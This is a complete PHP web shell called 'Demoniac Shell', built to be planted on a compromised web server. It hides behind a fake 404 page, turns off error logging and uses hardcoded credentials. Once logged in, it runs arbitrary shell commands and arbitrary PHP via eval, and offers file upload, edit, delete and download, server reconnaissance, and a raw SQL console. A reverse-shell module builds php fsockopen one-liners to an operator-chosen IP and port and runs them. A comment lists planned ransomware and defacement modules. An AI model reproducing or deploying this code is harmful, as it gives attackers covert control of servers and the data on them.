<?php
ob_start();
/*
[INFO]:
    Title: Demoniac Shell
    Writed by: vida
    Version: 1.0
[ACCOUNT - DEFAULT]:
    Username: v1d4
    Password: v1d4
*/
session_start();
error_reporting(0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@ini_set('html_errors', 0);
@ini_set('log_errors', 0);
@ini_set('error_log', NULL);
@ini_set('display_startup_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('max_file_uploads', 0);
@ini_set('upload_max_filesize', 0);

// debug: ini_set('display_errors', 1);

if(!isset($_GET['d3moniac']) && !isset($_SESSION['auth']) && $_SESSION['auth'] != md5(crypt($_POST['pass'], $pass_salt))){
    header("HTTP/1.0 404 Not Found");
    die();
}
?>
<html>
    <style type="text/css">
        body{
            background-color: #030303;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            color: white;
        }
        h1 a{
            color: #CE0000;
            font-size: 60px;
            text-decoration: none;
        }
        div.login{
            text-align: center;
            margin-top: 10%;
        }
        div.infos{
            border-left: 2px solid red;
            border-bottom: 2px solid red;
            padding-left: 10px;
            margin-bottom: 10px;
        }
        div.console{
            height: 30%;
            overflow: auto;
        }
        span.text{
            color: mintcream;
            font-size: 30px;
        }
        input{
            background-color: #000000;
            font-size: 20px;
            border: 2px solid black;
            border-radius: 5px;
            color: mintcream;
            font-weight: bold;
        }
        input:hover{
            background-color: #020202;
        }
        input:focus{
            outline: white;
        }
        input.hide{
            display: none;
        }
        input[type="submit"]{
            background-color: transparent;
            border: none;
        }
        input[type="submit"]:hover{
            cursor: pointer;
            color: #CE0000;
        }
        input.line_exec{
            background-color: transparent;
            font-size: 17px;
            border: none;
        }
        th{
            border-left: 3px solid #CE0000;
        }
        th.fields_file{
            border-bottom: 3px solid #CE0000;
        }
        .submit_file:hover .submit_dir:hover{
            cursor: pointer;
            color: red;
        }
        .submit_file{
            color: white;
        }
        .submit_dir{
            color: #A2A2A2;
        }
        select{
            background-color: black;
            color: white;
            font-size: 25px;
        }
        label{
            border: 2px solid black;
            font-size: 27px;
            background-color: black;
            padding: 6px;
            border-radius: 5px;
        }
        label:hover{
            cursor: pointer;
            color: red;
        }
        a{
            color: red;
            text-decoration:none
        }
    </style>
    <head>
        <title>hell</title>
    </head>
    <body>
        <div style="position:fixed;top:0;left:0;background-image: linear-gradient(0deg, #3B0000, black);width:100%;height:100%;z-index:-99;"></div>
        <h1 style="text-align: center; text-shadow: 0px 0px 6px red;"><a href="<?php echo $_SERVER['SCRIPT_NAME'];?>">⛧ Demoniac Shell ⛧</a></h1>
        <?php
            if(!isset($_SESSION['auth']) && $_SESSION['auth'] != md5(crypt($_POST['pass'], $pass_salt))){
        ?>
        <div class="login">
            <form method="POST">
                <span class="text">User: </span> <input type="text" name="user" placeholder="user" required maxlength="" autocomplete="off" maxlength="15" size="13" autofocus/><br><br>
                <span class="text">Pass: </span> <input type="password" name="pass" placeholder="pass" required maxlength="" maxlength="15" size="13" /><br><br>
                <input type="submit" class="hide"/>
            </form>
        </div>
        <?php
            function check($user_recv, $pass_recv){
                $user = "v1da"; // max length seven
                $user_salt = "p0"; // max length two

                $pass = "v1da"; // max length seven
                $pass_salt = "lz"; // max length two

                $user_recv = crypt($user_recv, $user_salt);
                $pass_recv = crypt($pass_recv, $pass_salt);

                if($user_recv == crypt($user, $user_salt) && $pass_recv == crypt($pass, $pass_salt)){
                    $_SESSION['auth'] = md5($pass_recv);
                    header("Refresh: 0 ; url=".$_SERVER['PHP_SELF']);
                } else {
                    die();
                }
            }
            if(isset($_POST['user']) && isset($_POST['pass'])){
                check($_POST['user'], $_POST['pass']);
            } else {
                die();
            }
        } else {
            $GLOBALS['current_path'] = getcwd();
            function convertByte($s){
                if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
                elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
                elseif ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
                else return $s . ' B';
            }
            function getinfo($info){
                if(ini_get('safe_mode')){
                    $safemode = "On";
                } else {
                    $safemode = "Off";
                }
                $infos = array(
                    "uname" => php_uname(),
                    "software" => $_SERVER["SERVER_SOFTWARE"],
                    "timeOnServer" => date("m/d/Y - H:i:s", time()),
                    "sapiName" => php_sapi_name(),
                    "freeSize" => convertByte(disk_free_space("/")),
                    "totalSize" => convertByte(disk_total_space("/")),
                    "version" => phpversion(),
                    "safeMode" => $safemode,
                    "serverIp" => gethostbyname($_SERVER['HTTP_HOST']),
                    "serverPort" => $_SERVER['SERVER_PORT'],
                    "userIp" => $_SERVER['REMOTE_ADDR'],
                    "admin_id" => $_SERVER['SERVER_ADMIN'],
                    "hostname" => gethostname(),
                    "pwd" => getcwd(),
                    "username" => get_current_user(),
                    "uid" => getmyuid(),
                    "gid" => getmygid(),
                    "pid" => getmypid(),
                    "lastModified" => date("m/d/Y - H:i:s", getlastmod()),
                );
                return $infos[$info];
            }
            function cmd($command){
                system($command, $retval);
                if($retval == 127){
                    echo "Return Code: 127 (Unknow Command)";
                } elseif($retval != 0){
                    echo "Return Code: ".$retval;
                }
            }
            function getOS(){
                if(strtoupper(substr(PHP_OS, 0, 3)) == "WIN"){
                    $os = "WIN";
                } elseif(strtoupper(substr(PHP_OS, 0, 3)) == "LIN"){
                    $os = "LIN";
                } else {
                    $os = "LIN";
                }
                return $os;
            }
            function banner(){
                $os = getOS();
                if($os == "LIN"){
                    $banner = "<span style='color: red;'>".getinfo("username")."@".getinfo("hostname")."</span>:".getinfo("pwd")."#";
                } elseif($os == "WIN"){
                    $banner = "<span style='color: red;'>".getinfo("pwd").DIRECTORY_SEPARATOR.getinfo("username").">";
                }
                return $banner;
            }
            function getinfoUser($type, $query){
                if($type == "uid"){
                    if($infos = posix_getpwnam($query)){}
                    elseif($infos = posix_getpwuid($query)){}

                    foreach($infos as $info => $result){
                        echo "<p style='text-align: center;font-size: 23px;'>".$info." -> ".$result."</p>\n";
                    }
                } elseif($type == "gid"){
                    if($infos = posix_getgrnam($query)){} 
                    elseif($infos = posix_getgrgid($query)){}

                    foreach($infos as $info => $result){
                        if(!is_array($result)){
                            echo "<p style='text-align: center;font-size: 23px;'>".$info." -> ".$result."</p>\n";
                        } else {
                            foreach($result as $id => $name){
                                echo "<p style='text-align: center;font-size: 23px;'>member: \n".$id." -> ".$name."</p>\n";
                            }
                        }
                    }
                }
            }
            function makeDir($name, $mode = 0700){
                if(mkdir($name, (int) $mode)){
                    echo "<script>alert('Directory created successfully to: {$name}');</script>";
                } else {
                    echo "<script>alert('Could not create directory: {$name}');</script>";
                }
            }
            function makeFile($name, $content){
                if($file = fopen($name, 'w')){
                    fwrite($file, $content);
                    fclose($file);
                    echo "<script>alert('File created successfully to: {$name}');</script>";
                } else {
                    echo "<script>alert('Could not create file: {$name}')</script>";
                }
            }
            function copyFile($old_path, $new_path){
                if(copy($old_path, $new_path)){
                    echo "<script>alert('Successfully copied to: {$new_path}');</script>";
                } else {
                    echo "<script>alert('Could not copy file: {$old_path}');</script>";
                }
            }
            function unzipDir($zip_path, $path_to_unzip){
                $zip = new ZipArchive();

                if($zip->open($zip_path)){
                    $zip->extractTo($path_to_unzip);
                    $zip->close();
                    echo "<script>alert('Unzip successfully to: {$path_to_unzip}');</script>";
                } else {
                    echo "<script>alert('Could not unzip: {$zip_path}');</script>";
                }
            }
            // https://gist.github.com/MKorostoff/7015135
            function copy_dir($src,$dst) { 
                $dir = opendir($src); 
                @mkdir($dst); 
                while(false !== ( $file = readdir($dir)) ) { 
                    if (( $file != '.' ) && ( $file != '..' )) { 
                        if ( is_dir($src . DIRECTORY_SEPARATOR . $file) ) { 
                            copy_dir($src . DIRECTORY_SEPARATOR . $file,$dst . DIRECTORY_SEPARATOR . $file); 
                        } 
                        else { 
                            copy($src . '/' . $file,$dst . '/' . $file); 
                        } 
                    } 
                } 
                closedir($dir); 
            }
            function fileManager($dir){
                chdir($dir);
                $files = array_diff(scandir($dir), ['.']);
                $totalDirs = -1;
                $totalFiles = 0;
                foreach($files as $file){
                    if(is_dir($file)){
                        $totalDirs++;
                    } elseif(is_file($file)){
                        $totalFiles++;
                    }
                }
                $total = count($files) -1;
                echo "
                    <form method='POST'>
                        <p>| Dirs: {$totalDirs} - Files: {$totalFiles} | Total: {$total} | PWD: <input value={$dir} name='access_dir' autofocus style='font-size: 17px;'/></p>
                    </form>
                ";
                foreach($files as $file){
                    $perms = fileperms($file);
                    $realpath = realpath($file);
                    if (($perms & 0xC000) == 0xC000) {
                        $info = 's';
                    } elseif (($perms & 0xA000) == 0xA000) {
                        $info = 'l';
                    } elseif (($perms & 0x8000) == 0x8000) {
                        $info = '-';
                    } elseif (($perms & 0x6000) == 0x6000) {
                        $info = 'b';
                    } elseif (($perms & 0x4000) == 0x4000) {
                        $info = 'd';
                    } elseif (($perms & 0x2000) == 0x2000) {
                        $info = 'c';
                    } elseif (($perms & 0x1000) == 0x1000) {
                        $info = 'p';
                    } else {
                        $info = 'u';
                    }
                    $info .= (($perms & 0x0100) ? 'r' : '-');
                    $info .= (($perms & 0x0080) ? 'w' : '-');
                    $info .= (($perms & 0x0040) ?
                                (($perms & 0x0800) ? 's' : 'x' ) :
                                (($perms & 0x0800) ? 'S' : '-'));
                    $info .= (($perms & 0x0020) ? 'r' : '-');
                    $info .= (($perms & 0x0010) ? 'w' : '-');
                    $info .= (($perms & 0x0008) ?
                                (($perms & 0x0400) ? 's' : 'x' ) :
                                (($perms & 0x0400) ? 'S' : '-'));
                    $info .= (($perms & 0x0004) ? 'r' : '-');
                    $info .= (($perms & 0x0002) ? 'w' : '-');
                    $info .= (($perms & 0x0001) ?
                                (($perms & 0x0200) ? 't' : 'x' ) :
                                (($perms & 0x0200) ? 'T' : '-'));

                    if(is_dir($file)){
                        $size = "✖️";
                        $class = "submit_dir";
                        $exclusive_action = "<input type='submit' name='zip' value='Zip '/>";
                        $emoji = "🖿";
                        $empty = ((count(glob("$file/*")) === 0) ? true : false);
                        if($empty){
                            $emoji = "🗀";
                        }
                        if($file == '..'){
                            $emoji = "↩";
                        }
                    }
                    elseif(is_file($file)){
                        $size = convertByte(filesize($file));
                        $class = "submit_file";
                        $exclusive_action = "<input type='submit' name='edit' value='Edit'/>";
                        $emoji = "🗅";
                        if(pathinfo($file, PATHINFO_EXTENSION) == "zip"){
                            $exclusive_action .= "|<input type='submit' name='unzip' value='Unzip' />";
                        }
                    }
                    if(function_exists("posix_getpwuid")){
                        $owner = posix_getpwuid(fileowner($file))['name']." - ".posix_getgrgid(filegroup($file))['name'];
                    } else {
                        $owner = fileowner($file)." - ".filegroup($file);
                    }
                    $lastModified = date("m/d/Y - H:i:s", fileatime($file));
                    echo "
                        <tr style='text-align: left;font-size: 18px; font-weight: bold;'>
                            <form method='POST'>
                                <input type='hidden' value='true' name='fileManager'>
                                <input type='hidden' value={$realpath} name='realpath'>
                                <td>{$emoji}<input type='submit' value={$file} name='file' class={$class}/></td>
                            </form>
                            <td>{$size}</td>";
                            if(getOS() == "LIN"){
                                echo "
                                    <td>{$owner}</td>
                                    <td>{$info}</td>
                                ";
                            }
                            echo "
                            <td>{$lastModified}</td>
                            <form method='POST'>
                            <td>
                                <input type='hidden' value='true' name='fileManager'>
                                <input type='hidden' value={$realpath} name='file_action'/>
                                <input type='submit' name='delete' value='Delete'/>|<input type='submit' name='rename' value='Rename'/>|<input type='submit' name='copyFile' value='Copy'>|{$exclusive_action}
                            </td>
                            </form>
                        </tr>
                    ";
                }
            }
            function downloadFile($path_to_download){
                ob_clean();
                $name = basename($path_to_download);
                $ext = pathinfo($path_to_download, PATHINFO_EXTENSION);
                $size = filesize($path_to_download);
                header("Content-Type: application/{$ext}");
                header("Content-Disposition: attachment; filename={$name}");
                header("Content-Length: {$size}");
                readfile($path_to_download);
                flush();
            }
            function uploadFile($path){
                $file = $_FILES['file'];
                $destPath = $path.$file['name'];
                if(move_uploaded_file($file['tmp_name'], $destPath)){
                    echo "<script>alert('Successfully Uploaded in: \"{$destPath}\"')</script>";
                } else {
                    echo "<script>alert('Could not upload the file: {$destPath}')</script>";
                }
            }
            function Zip($source, $destination)
            {
                if (!extension_loaded('Zip') || !file_exists($source)) {
                    return false;
                }

                $Zip = new ZipArchive();
                if (!$Zip->open($destination, ZIPARCHIVE::CREATE)) {
                    return false;
                }

                $source = str_replace('\\', '/', realpath($source));

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = str_replace('\\', '/', $file);

                        // Ignore "." and ".." folders
                        if( in_array(substr($file, strrpos($file, '/')+1), array('.', '..')) )
                            continue;

                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $Zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }
                        else if (is_file($file) === true)
                        {
                            $Zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }
                else if (is_file($source) === true)
                {
                    $Zip->addFromString(basename($source), file_get_contents($source));
                }
                return $Zip->close();
            }
            function renameFile($old_name, $new_name){
                if(rename($old_name, $new_name)){
                    echo "<script>alert('Name changed successfully to: {$new_name}')</script>";
                } else {
                    echo "<script>alert('Could not change file name: {$old_name}')</script>";
                }
            }
            function removeRecursive($dir){
                $files = array_diff(scandir($dir), ['.', '..']);
                foreach($files as $file){
                    (is_dir("$dir/$file")) ? removeRecursive("$dir/$file") : unlink("$dir/$file");
                }
                return rmdir($dir);
            }
            function editContent($filename, $new_content){
                    if($file = fopen($filename, "w")){} else { echo "<script>alert('Failed to open file')</script>"; }
                    if(fwrite($file, $new_content)){} else { echo "<script>alert('Failed to write to file')</script>"; }
                    if(fclose($file)){ echo "<script>alert('File edited successfully')</script>"; } else { echo "<script>alert('Failed to close file')</script>"; }
            }
        ?>
        <table width="100%" bordercolor="#CE0000" style="border-radius: 5px;">
            <form method="POST">
                <th style="border-left: none;"><input type="submit" value="File Manager" name="fileManager"/></th>
                <th><input type="submit" value="File Upload" name="fileUpload"/></th>
                <?php
                    if(function_exists("posix_getpwuid")){
                        echo "<th><input type='submit' value='Get User Info' name='infoUser'/></th>";
                    }
                ?>
                <th><input type="submit" value="Rev Shell" name="revShell"></th>
                <th><input type="submit" value="SQL Query" name="sqlQuery"></th>
                <th><input type="submit" value="Eval" name="eval"/></th>
                <!-- Future Modules :) 
                <th><input type="submit" value="Auto Deface" name="autoDeface"></th>
                <th><input type="submit" value="Ransomware" name="ransomware"/></th>
                <th><input type="submit" value="Crazy Log" name="crazyLog"/></th>
                <th><input type="submit" value="Auto Destruct" name="AutoDestruct"/></th>
                -->
            </form>
        </table>
        <?php
            if(isset($_POST['infoUser']) || isset($_POST['query'])){
        ?>
                <form method='POST' style='text-align: center; margin-top: 10%'>
                    <select name="searchInfo">
                        <option value='uid'>UID</option>
                        <option value='gid'>GID</option>
                    </select>
                    <input type='text' autofocus style='font-size: 25px;' name='query' required/>
                    <input type='submit' class='hide'/>
                </form>
        <?php
                if(isset($_POST['query'])){
                    getinfoUser($_POST['searchInfo'], $_POST['query']);
                }
                die();
            }
            if(isset($_POST['fileUpload'])){
        ?>
                <p class="text" style="text-align: center;font-size: 45px;">File Upload</p>
                <form method="POST" enctype="multipart/form-data" style="text-align: center;">
                    <span class="text">Dir: </span><input type="text" name="path_to_upload" required autofocus/>
                    <br><br><br>
                    <input type="file" id="file" name="file" style="display: none;"/>
                    <label for="file">Select</label>
                    <input type="submit" style="border: 2px solid black; background-color: black;" name="upload"/>
                </form>
        <?php
                die();
            }
            if(isset($_POST['path_to_upload'])){
                uploadFile($_POST['path_to_upload']);
            }
            if(isset($_POST['nameNewDir'])){
                makeDir($_POST['nameNewDir'], $_POST['permNewDir']);
            }
            if(isset($_POST['nameNewFile'])){
                makeFile($_POST['nameNewFile'], $_POST['content']);
            }
            if(isset($_POST['newName'])){
                $new_name = dirname($_POST['path_to_rename']).DIRECTORY_SEPARATOR.$_POST['newName'];
                renameFile($_POST['path_to_rename'], $new_name);
            }
            if(isset($_POST['newContent'])){
                editContent($_POST['path_to_edit'], $_POST['newContent']);
            }
            if(isset($_POST['path_to_unzip'])){
                unzipDir($_POST['zip_name'], $_POST['path_to_unzip']);
            }
            if(isset($_POST['mkdir'])){
        ?>
                <p style='text-align: center;font-size: 45px;'>Create a new dir</p>
                <form method='POST' style='text-align: center; margin-top: 5%;'>
                    <span class='text'>Name: </span><input type='text' autofocus name='nameNewDir' required/><br><br>
                    <span class='text'>Perm - (Default = 0700): </span><input type='text' autofocus name='permNewDir'/><br><br><br>
                    <input type='submit' value='Create' style="border: 2px solid black; background-color: black;font-size: 25px;"/>
                </form>
        <?php
                die();
            }
            if(isset($_POST['rename']) && isset($_POST['file_action'])){
        ?>
                <p style="text-align: center; font-size: 35px;">Change Name - <?php echo basename($_POST['file_action']);?></p>
                <form method="POST" style="text-align: center;">
                    <span class="text">New Name: </span><input type="text" autofocus name="newName" required />
                    <input type="hidden" value=<?php echo $_POST['file_action'];?> name="path_to_rename"/>
                    <input type="hidden" name="fileManager" />
                    <input type='submit' class='hide' />
                </form>
        <?php
            }
            if(isset($_POST['mkfile'])){
        ?>
                    <p style='text-align: center;font-size: 45px;'>Create a new file</p>
                    <form method='POST' style='text-align: center; margin-top: 5%;'>
                        <span class='text'>Name: </span><input type='text' autofocus name='nameNewFile' required/><br><br>
                        <textarea rows='20' cols='50' style='background-color: black; color: white; font-weight: bold; border-radius: 5px;' name='content'></textarea><br><br><br>
                        <input type='submit' style="border: 2px solid black; background-color: black;font-size: 25px;" value="Create"/>
                    </form>
        <?php
                die();
            }
            if(isset($_POST['loginSQL']) || isset($_POST['querySQL'])){

                if(isset($_POST['portSQL'])){
                    $port = $_POST['portSQL'];
                } else {
                    $port = "3306";
                }
                if(isset($_POST['passSQL'])){
                    $pass = $_POST['passSQL'];
                } else {
                    $pass = "";
                }
                if(isset($_POST['db_type']) == "mySQL"){
                    $dsn = "mysql";
                } elseif(isset($_POST['db_type']) == "pgSQL"){
                    $dsn = "pgsql";
                }
                try{
                    if(isset($_POST['loginSQL'])){
                        $host = $_POST['hostSQL'];
                        $user = $_POST['userSQL'];
                        $db = $_POST['dbSQL'];

                        $pdo = new PDO("$dsn:dbname=$db;host=$host;port=$port", $user, $pass);

                        $_SESSION['portsql'] = $port;
                        $_SESSION['dsnsql'] = $dsn;
                        $_SESSION['hostsql'] = $host;
                        $_SESSION['usersql'] = $user;
                        $_SESSION['passsql'] = $pass;
                        $_SESSION['dbsql'] = $db;
                    }
                    $pdo = new PDO($_SESSION['dsnsql'].':dbname='.$_SESSION['dbsql'].';host='.$_SESSION['hostsql'].';port='.$_SESSION['portsql'], $_SESSION['usersql'], $_SESSION['passsql']);
        ?>
                    <p style="text-align: center; font-size: 35px;">SQL QUERY</p>
                    <form method='POST' style='text-align: center;'>
                        <textarea rows='3' cols='70' style='background-color: black; color: white; font-weight: bold; border-radius: 5px;' name='querySQL' autofocus></textarea>
                        <br><br>
                        <input type='submit' value="Execute" style="border: 2px solid black; background-color: black;"/>
                        <br><br><br>
                        <textarea rows='25' cols='80' style='background-color: black; color: white; font-weight: bold; border-radius: 5px;font-size: 15px;' disabled placeholder="output..."><?php
                            if(isset($_POST['querySQL'])){
                                $query = $pdo->query($_POST['querySQL']);
                                $result = $query->fetchAll(PDO::FETCH_ASSOC);
                                foreach($result as $res){
                                    echo implode(" | ", $res)."\n";
                                }
                            }
                        ?></textarea>
                    </form>
        <?php
                } catch(Exception $e){
                    if(isset($_POST['querySQL'])){
                        echo $e->getMessage();
                    } else {
                        echo "<p style='text-align: center; font-size: 35px;'>SQL ERROR</p>";
                        echo "<p style='text-align: center; font-size: 25px;'>".$e->getMessage()."</p>";
                        echo "
                            <form method='POST' style='text-align: center;'><br><br>
                                <input type='submit' value='Try Again' name='sqlQuery' style='border: 2px solid black; background-color: black;'/>
                            </form>
                        ";
                    }
                }
                die();
            }
            if(isset($_POST['sqlQuery'])){
        ?>
                <p style='text-align: center;font-size: 45px;'>SQL Query</p>
                <div style="text-align: center; border: 3px solid white;padding: 2%;width: 55%;border-radius: 10px;left: 50%;margin: auto;">
                <form method='POST' style='text-align: center;'>
                    <select name='db_type'>
                        <option value='mySQL'>MySQL</option>
                        <option value='pgSQL'>PostgreSQL</option>
                    </select><br><br><br>
                    <span style='font-size: 25px;'>Host: <input type='text' name='hostSQL' required size='10' autofocus/>
                    <span style='font-size: 25px;'>Port (3306): </span><input type='text' name='portSQL' size='5'/><br><br>
                    <span style='font-size: 25px;'>User: </span><input type='text' name='userSQL' required size='12'/>
                    <span style='font-size: 25px;'>Pass: </span><input type='text' name='passSQL' size='12'/><br><br>
                    <span style='font-size: 25px;'>DB: </span><input type='text' name='dbSQL' required size='12'/><br><br>
                    <input type='submit' value='Connect' style='border: 2px solid black; background-color: black;' name='loginSQL'>
                </form>
                </div>
        <?php
                die();
            }
            if(isset($_POST['revShell']) || isset($_POST['findShells']) || isset($_POST['revConnect'])){
        ?>
                <p style='text-align: center;font-size: 45px;'>Reverse Shell</p>
                <form method="POST" style="text-align: center;">
                    <span class="text">IP: </span><input type="text" name="destIP" size="15" autofocus required/>
                    <span class="text">Port: </span><input type="text" name="destPORT" size="10" required/>
                    <input type="submit" class="hide" name="findShells"/>
                </form>
        <?php
                if($_POST['findShells']){
                    $destIP = $_POST['destIP'];
                    $destPORT = $_POST['destPORT'];
        ?>
                    <form method="POST" style="text-align: center;">
                        <select name="shell" style="margin-top: 3%;">
                            <?php
                            if(getOS() == "LIN"){
                            ?>
                            <option value="php_sh">php -r '$sock=fsockopen("<?php echo $destIP;?>", <?php echo $destPORT;?>);system("/bin/sh <&3 >&3 2>&3");'</option>
                            <option value="php_bash">php -r '$sock=fsockopen("<?php echo $destIP;?>", <?php echo $destPORT;?>);system("/bin/bash <&3 >&3 2>&3");'</option>
                            <?php
                            } if (getOS() == "WIN"){?>
                            <option value="php_cmd">php -r '$sock=fsockopen("<?php echo $destIP;?>", <?php echo $destPORT;?>);system("cmd <&3 >&3 2>&3");'</option>
                            <option value="php_powshell">php -r '$sock=fsockopen("<?php echo $destIP;?>", <?php echo $destPORT;?>);system("powershell <&3 >&3 2>&3");'</option>
                            <?php } ?>
                        </select><br><br><br>
                        <input type="hidden" value=<?php echo $destIP;?> name="destIP"/>
                        <input type="hidden" value=<?php echo $destPORT;?> name="destPORT"/>
                        <input type="submit" name="revConnect" style="border: 2px solid black; background-color: black;" value="Connect"/>
                    </form>
        <?php
                }
                if($_POST['revConnect']){
                    $destIP = $_POST['destIP'];
                    $destPORT = $_POST['destPORT'];
                    
                    $rev_shell = function($type){
                        return 'php -r \'$sock=' . "fsockopen(" . '"' . $_POST['destIP'] . '"' . ",".$_POST['destPORT'].");system(\"$type <&3 >&3 2>&3\");'";
                    };

                    if($_POST['shell'] == "php_sh"){
                        cmd($rev_shell("/bin/sh"));
                    } elseif($_POST['shell'] == "php_bash"){;
                        cmd($rev_shell("/bin/bash"));
                    } elseif($_POST['shell'] == "php_cmd"){
                        cmd($rev_shell("cmd"));
                    } elseif($_POST['shell'] == "php_powshell"){
                        cmd($rev_shell("powershell"));
                    }
                }
                die();
            }
            if(isset($_POST['unzip'])){
        ?>
                <p style="text-align: center; font-size: 35px;">Unzip - <?php echo basename($_POST['file_action']);?></p>
                <form method="POST" style="text-align: center;">
                    <span class="text">Unzip to: </span><input type="text" autofocus name="path_to_unzip" required />
                    <input type="hidden" value=<?php echo $_POST['file_action'];?> name="zip_name"/>
                    <input type="hidden" name="fileManager"/>
                    <input type='submit' class='hide' />
                </form>
        <?php
            }
            if(isset($_POST['zip'])){
                $name_to_zip = $_POST['file_action'];
                $zip_full_name = $name_to_zip.".zip";
                if(Zip($name_to_zip, $zip_full_name)){
                    echo "<script>alert('Successfully zipped directory to: $zip_full_name');</script>";
                } else {
                    echo "<script>alert('Could not zip directory: $name_to_zip');</script>";
                }
            
            }
            if(isset($_POST['file_action']) && isset($_POST['delete'])){
                $file = $_POST['file_action'];
                if(is_dir($file)){
                    if(rmdir($file)){}
                    elseif(removeRecursive($file)){} else {
                        echo "<script>alert('Could not delete the directory: {$file}');</script>";
                    }
                } elseif(is_file($file)){
                    if(unlink($file)){} else {
                        echo "<script>alert('Could not delete the file: {$file}');</script>";
                    }
                }
            }
            if(isset($_POST['eval']) || isset($_POST['commandEval'])){
        ?>
                <p style='text-align: center;font-size: 45px;'>Eval - PHP</p>
                <form method='POST' style='text-align: center;'>
                <textarea rows='15' cols='70' style='background-color: black; color: white; font-weight: bold; border-radius: 5px;' name='commandEval' autofocus></textarea>
                <br><br>
                <input type='submit' value="Execute" style="border: 2px solid black; background-color: black;"/>
                <br><br><br>
                <textarea rows='15' cols='70' style='background-color: black; color: white; font-weight: bold; border-radius: 5px;' disabled placeholder="output..."><?php
                if(isset($_POST['commandEval'])){
                    eval($_POST['commandEval']);
                }
                die();
            }
            if(isset($_POST['edit']) && isset($_POST['file_action'])){
        ?>
                <p style='text-align: center;font-size: 45px;'>Edit File</p>
                <form method='POST' style='text-align: center; margin-top: 5%;'>
                    <textarea rows='30' cols='170' style='background-color: black; color: white; font-weight: bold; border-radius: 5px;' name='newContent'><?php 
                        if($file = fopen($_POST['file_action'], 'r')){
                            while(!feof($file)){
                                $line = fgets($file);
                                echo $line;
                            }
                            fclose($file);
                        } else {
                            echo "Could not read data from file: {$file}";
                        }
                ?></textarea><br><br>
                <input type="hidden" value=<?php echo $_POST['file_action'];?> name="path_to_edit"/>
                <input type='submit' value="Salvar" style="border: 2px solid black; background-color: black;"/>
                </form>
        <?php
                die();
            }
            if(isset($_POST['path_to_copy'])){
                $path_to_copy = $_POST['path_to_copy'];
                $dir_to_copy = $_POST['dir_to_copy'];
                if(is_dir($dir_to_copy)){
                    if(copy_dir($dir_to_copy, $path_to_copy)){} else {
                        echo "<script>alert('Successfully copied to: {$path_to_copy}')</script>";
                    }
                } elseif(is_file($dir_to_copy)){
                    copyFile($dir_to_copy, $path_to_copy);
                }
            }
            if(isset($_POST['copyFile'])){
        ?>
                <p style="text-align: center; font-size: 35px;">Copy File - <?php echo basename($_POST['file_action']);?></p>
                <form method="POST" style="text-align: center;">
                    <span class="text">Copy to: </span><input type="text" autofocus name="path_to_copy" required />
                    <input type="hidden" value=<?php echo $_POST['file_action'];?> name="dir_to_copy"/>
                    <input type="hidden" name="fileManager">
                    <input type='submit' class='hide' />
                </form>
        <?php
            }
            if(isset($_POST['fileManager']) || isset($_POST['access_dir'])){
        ?>
                    <form method='POST' style='margin-top: 12px;'>
                        <span style='color: red; font-size: 20px'>|</span>
                        <input type='submit' value='Make Dir' name='mkdir'/>
                        <span style='color: red; font-size: 20px'>|</span>
                        <input type='submit' value='Make File' name='mkfile'/>
                    </form>
                    <table width='100%' bordercolor='#CE0000' style='font-size: 20px; border-radius: 5px;'>
                    <th class='fields_file' style='border-left: none;'>Name</th>
                    <th class='fields_file'>Size</th>
                    <?php
                        if(getOS() == "LIN"){
                            echo "
                                <th class='fields_file'>Permission</th>
                                <th class='fields_file'>User - Group</th>
                            ";
                        }
                    ?>
                    <th class='fields_file'>Last Modified</th>
                    <th class='fields_file'>Action</th>
        <?php
                if(isset($_POST['access_dir'])){
                    $access = $_POST['access_dir'];
                    if(is_dir($access)){
                        fileManager($_POST['access_dir']);
                    } elseif(is_file($access)){
                        downloadFile($access);
                    }
                    die();
                }
                if(isset($_POST['file'])){
                    $file = $_POST['realpath'];
                    if(is_dir($file)){
                        fileManager($file);
                    } elseif(file_exists($file) && is_file($file)){
                        downloadFile($file);
                    }
                } else {
                    fileManager($GLOBALS['current_path']);
                }
                echo "</table>";
                die();
            }
        ?>
        <div class="infos">
        <?php
            echo "<p>Uname: ".getinfo("uname")."</p>";
            echo "<p>Software: ".getinfo("software")."</p>";
            echo "<p>Time On Server: ".getinfo("timeOnServer")."</p>";
            echo "<p>PHP Version: ".getinfo("version")." on ".getinfo("sapiName")." | Safe Mode: ".getinfo("safeMode")." | PID: ".getinfo("pid")."</p>";
            echo "<p>Server IP: ".getinfo("serverIp")." | Port: ".getinfo("serverPort")."</p>";
            echo "<p>Your User: ".getinfo("username")." | UID: ".getinfo("uid")." | GID: ".getinfo("gid")."</p>";
            echo "<p>Your IP: ".getinfo("userIp")."</p>";
            echo "<p>Host Name: ".getinfo("hostname")." | Admin: ".getinfo("admin_id")."</p>";
            echo "<p>Total Size: ".getinfo("totalSize")." | Free Size: ".getinfo("freeSize")."</p>";
            echo "<p>PWD: ".getinfo("pwd")."</p>";
            echo "<p>Last Modified: ".getinfo("lastModified")."</p>";
        ?>
        </div>
        <div class="console">
            <form method="POST">
                <?php echo banner();?>
                <input type="text" class='line_exec' autofocus name="input" size="70" />
                <input type="submit" class="hide"/>
            </form>
            <pre style="font-size: 16px;"><?php
                if(isset($_POST['input'])){
                    cmd($_POST['input']);
                }
            ?>
            </pre>
        </div>
        <div>
            <ul style="text-align: center;list-style: none";>
                <l1>
                    <a href="https://github.com/vida00" target="_blank">GitHub</a> |
                    <a href="https://vida799543998.wordpress.com/" target="_blank">Site</a> |
                    <a href="https://discord.gg/WeCPyHPYfV" target="_blank">Discord</a>
                </l1>
            </ul>
        </div>
        <?php ob_end_flush(); }?>
    </body>
</html>